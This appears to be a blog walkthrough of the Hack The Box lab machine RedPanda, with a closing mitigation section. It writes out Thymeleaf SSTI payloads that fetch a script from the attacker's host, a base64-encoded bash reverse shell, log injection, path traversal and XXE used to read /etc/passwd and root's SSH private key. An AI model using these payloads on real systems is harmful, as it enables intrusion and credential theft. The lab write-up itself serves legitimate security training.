---
layout: post
title: Hack The Box Walkthrough - RedPanda
date: 2022-08-27
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2022/08/HTB/RedPanda
img: 2022/08/RedPanda/RedPanda.png
---

In this machine, I had to exploit [Server Site Template Injection (SSTI)](https://portswigger.net/web-security/server-side-template-injection) to obtain a shell on the machine. Then I exploited a few bugs in a Java application to obtain privilege escalation.

* Room: Late
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/RedPanda](https://app.hackthebox.com/machines/RedPanda)
* Author: [Woodenk](https://app.hackthebox.com/users/25507)

## Enumeration

As usual, I started the box by enumerating the open ports. 

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.118.18:22
Open 10.129.118.18:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-14 18:57 EDT

...

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN
1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIG
PZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
8080/tcp open  http-proxy syn-ack
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Thu, 14 Jul 2022 22:57:47 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
...
```

There were only 2 open ports:

- 22 - ssh
- 8080 - http 

Since there was an HTTP site, I launched Feroxbuster to check for hidden files and folders.

```bash
$ feroxbuster -u http://target.htb:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       55l      119w        0c http://target.htb:8080/
405      GET        1l        3w        0c http://target.htb:8080/search
200      GET       32l       97w        0c http://target.htb:8080/stats
500      GET        1l        1w        0c http://target.htb:8080/error
[####################] - 2m    126176/126176  0s      found:4       errors:0
[####################] - 2m     63088/63088   479/s   http://target.htb:8080
[####################] - 2m     63088/63088   479/s   http://target.htb:8080/
```

It did not find much.

## Web Site

I opened a browser to look at the website on port 8080.

![Red Panda Search](/assets/images/2022/08/RedPanda/RedPandaSearch.png "Red Panda Search")

I tried the search functionality.

![Search Results](/assets/images/2022/08/RedPanda/SearchResults.png "Search Results")

There was also an author's page that showed how many times a panda was viewed.

![Author's Page](/assets/images/2022/08/RedPanda/AuthorPage.png "Author's Page")

The `Export table` link gave the same stats in XML.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

I tried attacking the search page for a while. I quickly found that some characters were banned (%_$). I tried SQL Injection, SSTI, and command injection. Sending closing parantheses were returning an error. So I thought it might have been vulnerable to LDAP injection. I spent a lot of time trying to exploit LDAP, but nothing worked. I also launched sqlmap on the search and author pages, but it did not find anything.

After a while, I gave a second attempt at SSTI. I tried the payload from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). When I got to `#{7*7}` it worked.

I sent the payload as the name to search. 

```http
POST /search HTTP/1.1
Host: target.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://target.htb:8080
Connection: close
Referer: http://target.htb:8080/
Upgrade-Insecure-Requests: 1

name=#{7*7}
```

And the results contained `49` instead of `#{7*7}`

```http
HTTP/1.1 200 
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Sat, 27 Aug 2022 14:37:35 GMT
Connection: close
Content-Length: 735

<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Red Panda Search | Made with Spring Boot</title>
    <link rel="stylesheet" href="css/search.css">
  </head>
  <body>
    <form action="/search" method="POST">
    <div class="wrap">
      <div class="search">
        <input type="text" name="name" placeholder="Search for a red panda">
        <button type="submit" class="searchButton">
          <i class="fa fa-search"></i>
        </button>
      </div>
    </div>
  </form>
    <div class="wrapper">
  <div class="results">
    <h2 class="searched">You searched for: ??49_en_US??</h2>
      <h2>There are 0 results for your search</h2>
       
    </div>
    </div>
    
  </body>
</html>
```

I looked for ways to run commands with this. The site advertised in its title that it's built with [Spring Boot](https://spring.io/projects/spring-boot) so I knew it used Java. Most of the [examples I found](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/) use `${command}` to send commands. But `$` was forbidden. So I had to find something else.

By trying different syntaxes, I found that I could use `#{command}` instead.

I tried to get the user running the server.

```
name=*{T(java.lang.Runtime).getRuntime().exec('id')}
```

And it returned information about the process that was launched.

```
You searched for: Process[pid=1620, exitValue=0]
```

To confirm that it was really executed, I tried sending a request to my machine.

```
name=*{T(java.lang.Runtime).getRuntime().exec('curl http://10.10.14.143')}
```

I received the request. 

```bash
$ nc -klvnp 80  
Listening on 0.0.0.0 80
Connection received on 10.129.49.130 42368
GET / HTTP/1.1
Host: 10.10.14.143
User-Agent: curl/7.68.0
Accept: */*
```

Next, I tried getting a reverse shell using the SSTI. 

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.143/4444 0>&1 ' | base64 
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQzLzQ0NDQgMD4mMSAK
```

I sent the command. It gave me a process, but my listener did not get a hit.

```
name=*{T(java.lang.Runtime).getRuntime().exec('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQzLzQ0NDQgMD4mMSAK | base64 -d | bash')}
```

I played with it but could not get it to work. So I decided to get the shell in two steps instead. 

I created a small shell script to create the reverse shell.

```bash
$ cat shell.sh          
echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQzLzQ0NDQgMD4mMSAK | base64 -d | bash
```

I used the SSTI to get the script on the server.

```http
POST /search HTTP/1.1
Host: target.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
Origin: http://target.htb:8080
Connection: close
Referer: http://target.htb:8080/
Upgrade-Insecure-Requests: 1

name=*{T(java.lang.Runtime).getRuntime().exec('curl http://10.10.14.143/shell.sh -o /tmp/shell.sh')}
```

And then execute the script.

```http
POST /search HTTP/1.1
Host: target.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: http://target.htb:8080
Connection: close
Referer: http://target.htb:8080/
Upgrade-Insecure-Requests: 1

name=*{T(java.lang.Runtime).getRuntime().exec('bash /tmp/shell.sh')}
```

My netcat listener got a hit, and I was able to get the user flag.

```bash
$ nc -klvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.49.163 40732
bash: cannot set terminal process group (867): Inappropriate ioctl for device
bash: no job control in this shell

woodenk@redpanda:/tmp/hsperfdata_woodenk$ whoami
whoami
woodenk

woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd
cd

woodenk@redpanda:~$ ls
ls
user.txt

woodenk@redpanda:~$ cat user.txt
cat user.txt
REDACTED
```

## Privilege Escalation

Before I tried to get root on the box, I copied my ssh key to the server and reconnected with ssh.

```bash
woodenk@redpanda:~$ mkdir .ssh
mkdir .ssh

woodenk@redpanda:~$ chmod 700 .ssh
chmod 700 .ssh

woodenk@redpanda:~$ echo ssh-rsa PUBLIC_KEY > .ssh/authorized_keys

woodenk@redpanda:~$ chmod 600 .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
```

I looked around the server for ways to escalate my privileges. I could not run `sudo` without the user's password. I did not see anything out of the ordinary in the `suid` files and did not find any cronjobs. I launched [linPEAS](https://github.com/carlospolop/PEASS-ng) and did not see anything there. Except that root was able to ssh to the server.

When I looked in `/opt`, I found some interesting files and folders.

```bash
woodenk@redpanda:~$ cd /opt

woodenk@redpanda:/opt$ ls
cleanup.sh  credit-score  maven  panda_search
```

The cleanup script was removing XML files and images from a few folders.

```bash
woodenk@redpanda:/opt$ cat cleanup.sh 
#!/bin/bash
/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
```

`panda_search` was the website. `credit-score` looked promising. It contained a Java application that parsed some logs to generate the statistics that are displayed on the author's page.

```java
package com.logparser;

// Bunch of imports

public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
            
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}
```

This code is doing the following:
1. Read the website logs from `/opt/panda_search/redpanda.log`
1. Loop through all lines
1. Verify that the log is for getting an image
1. Parse the log line
1. Get the artist from the image metadata
1. Open the XML file that contains the statistics for the artist
1. Increment the number of views for the image
1. Save the changes in the XML file

The statistics were updated every two minutes, and only root had access to `/credits`. So I guess there was a cronjob running the application as root. I figured I could use this to read any files from the server. 

The log files contained the requests sent to the server with fields separated by `||`. And it was truncated every time the application ran.

```bash
woodenk@redpanda:/opt$ tail -f /opt/panda_search/redpanda.log

200||10.10.14.143||Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0||/search
200||10.10.14.143||Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0||/img/florida.jpg
200||10.10.14.143||Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0||/img/angy.jpg

tail: /opt/panda_search/redpanda.log: file truncated
```

### Image Validation
The image validation code takes the entire line and searches for `.jpg`. So as long as the extension was anywhere in the log line, it will be valid.


```java
public static boolean isImage(String filename){
    if(filename.contains(".jpg"))
    {
        return true;
    }
    return false;
}
```

### Parsing the Logs

The method that parsed the logs was simply splitting them at every `||` and using the fourth part as the image URI.

```java
public static Map parseLog(String line) {
    String[] strings = line.split("\\|\\|");
    Map map = new HashMap<>();
    map.put("status_code", Integer.parseInt(strings[0]));
    map.put("ip", strings[1]);
    map.put("user_agent", strings[2]);
    map.put("uri", strings[3]);
    

    return map;
}
```

I figured I could use Burp Repeater to send a user_agent containing `||` and an arbitrary file path after the pipes. This will be used as the URI and the real one from the request would be ignored.

### Getting the Artist

The code uses the `Artist` metadata of the image to decide who should get the number of views incremented. 

```java
public static String getArtist(String uri) throws IOException, JpegProcessingException
{
    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
    File jpgFile = new File(fullpath);
    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
    for(Directory dir : metadata.getDirectories())
    {
        for(Tag tag : dir.getTags())
        {
            if(tag.getTagName() == "Artist")
            {
                return tag.getDescription();
            }
        }
    }

    return "N/A";
}
```

### Updating the Statistics

The artist name is then used in the file name of the XML that contains the stats.

```java
String artist = getArtist(parsed_data.get("uri").toString());
System.out.println("Artist: " + artist);
String xmlPath = "/credits/" + artist + "_creds.xml";
addViewTo(xmlPath, parsed_data.get("uri").toString());
```

And the number of views is incremented if the image URI is found in the XML file.


```java
public static void addViewTo(String path, String uri) throws JDOMException, IOException
{
    SAXBuilder saxBuilder = new SAXBuilder();
    XMLOutputter xmlOutput = new XMLOutputter();
    xmlOutput.setFormat(Format.getPrettyFormat());

    File fd = new File(path);
    
    Document doc = saxBuilder.build(fd);
    
    Element rootElement = doc.getRootElement();

    for(Element el: rootElement.getChildren())
    {

        
        if(el.getName() == "image")
        {
            if(el.getChild("uri").getText().equals(uri))
            {
                Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                System.out.println("Total views:" + Integer.toString(totalviews));
                rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                Integer views = Integer.parseInt(el.getChild("views").getText());
                el.getChild("views").setText(Integer.toString(views + 1));
            }
        }
    }
    BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
    xmlOutput.output(doc, writer);
}
```

## The Exploit

To exploit the application, I downloaded one of the images, modified the Artist metadata, and uploaded the image back on the server.

```bash
$ exiftool greg.jpg | grep Artist        
Artist                          : woodenk

$ exiftool -Artist="../tmp/eric" greg.jpg
Warning: [minor] Ignored empty rdf:Bag list for Iptc4xmpExt:LocationCreated - greg.jpg
    1 image files updated


$ exiftool greg.jpg | grep Artist        
Artist                          : ../tmp/eric

$ scp greg.jpg woodenk@target:/tmp      
```

Next, I downloaded the XML stats of one author. I added a line for my new image in `tmp`. And uploaded the file in `/tmp/eric_creds.xml`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>9</views>
  </image>
  <image>
    <uri>/../../../../../../tmp/greg.jpg</uri>
    <views>1</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>9</totalviews>
</credits>
```

Lastly, I sent a request to the web server with the user agent crafted to overwrite the URI with a value that would read the image I modified earlier.

```http
GET /img/greg.jpg HTTP/1.1
Host: target.htb:8080
User-Agent: fakeagent||/../../../../../../tmp/greg.jpg
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Wed, 22 Jun 2022 09:07:03 GMT
Cache-Control: max-age=0
```

The request was inserted in the log file.
```bash
woodenk@redpanda:/opt$ tail -f /opt/panda_search/redpanda.log

304||10.10.14.143||fakeagent||/../../../../../../tmp/greg.jpg||/img/greg.jpg
```

And after a short wait, the number of views was incremented in the XML file.

```xml
woodenk@redpanda:~$ cat /tmp/eric_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>9</views>
  </image>
  <image>
    <uri>/../../../../../../tmp/greg.jpg</uri>
    <views>2</views> <!-- INCREMENTED -->
  </image>
...
```

## Reading Files

I knew I could get the application to modify my XML. The next step was to see if I could use it to get [XML external entity injection](https://portswigger.net/web-security/xxe).

I modified the XML to try to read `/etc/passwd`. 

```xml
woodenk@redpanda:~$ cat /tmp/eric_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>9</views>
  </image>
  <image>
    <uri>/../../../../../../tmp/greg.jpg</uri>
    <views>2</views>
    <file>&xxe;</file>
  </image>
...
```

I sent another tampered request and waited. My XML file was modified with the content of the passwd file.

```bash
woodenk@redpanda:~$ cat /tmp/eric_creds.xml                                                                           
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>                
<credits>           
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>  
    <views>9</views>
  </image>
  <image>                    
    <uri>/../../../../../../tmp/greg.jpg</uri>
    <views>2</views>
    <file>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

I then use the same technique to read root's ssh private key.

```xml
woodenk@redpanda:~$ cat /tmp/eric_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>9</views>
  </image>
  <image>
    <uri>/../../../../../../tmp/greg.jpg</uri>
    <views>1</views>
    <file>&xxe;</file>
  </image>
```

I copied the returned key on my machine and used it to connect as root.

```bash
$ ssh -i root_id root@target
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

...

Last login: Thu Jun 30 13:17:41 2022

root@redpanda:~# cat root.txt 
REDACTED
```

## Mitigation

The first issue with the application is the SSTI. The searched term is returned in the search response and printed on this line.

```html
<h2 th:unless="${query} == Null" th:text="${'You searched for: '} + @{__${query}__}" class="searched"></h2> 
```

The `__${query}__` [preprocess the query](https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#preprocessing) and the code is executed. If the query needs to be reflected back to the user, it should be escaped and pass to the template in a way that it won't be executed.

The next issue is with the way the statistics are computed.

The website generates some logs and writes them to a file. The is no sanitation and nothing is escaped before the logs are written.

```java
public void afterCompletion (HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        System.out.println("interceptor#postHandle called. Thread: " + Thread.currentThread().getName());
        String UserAgent = request.getHeader("User-Agent");
        String remoteAddr = request.getRemoteAddr();
        String requestUri = request.getRequestURI();
        Integer responseCode = response.getStatus();
        /*System.out.println("User agent: " + UserAgent);
        System.out.println("IP: " + remoteAddr);
        System.out.println("Uri: " + requestUri);
        System.out.println("Response code: " + responseCode.toString());*/
        System.out.println("LOG: " + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri);
        FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
        BufferedWriter bw = new BufferedWriter(fw);
        bw.write(responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri + "\n");
        bw.close();
    }
```

When the logs are read back from the file, there is no validation of the log format. This allowed me to inject a URI into the user agent. 

Same thing with the way the Artist is extracted from images. There is no validation of the path where the image is read from, and no validation of the value that it gets from the metadata. And no validation of the XML file path.

The XXE could have been prevented by telling the SAXBuilder to [not expend entities](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#saxbuilder).

The entire way the number of views is counted seems too complicated. There is already a class that intercepts the requests and log them. It would probably have been easier to just log the image views in that class. The search page reads the images from a database. The author could have been extracted from the database, and the statistics could be written there also.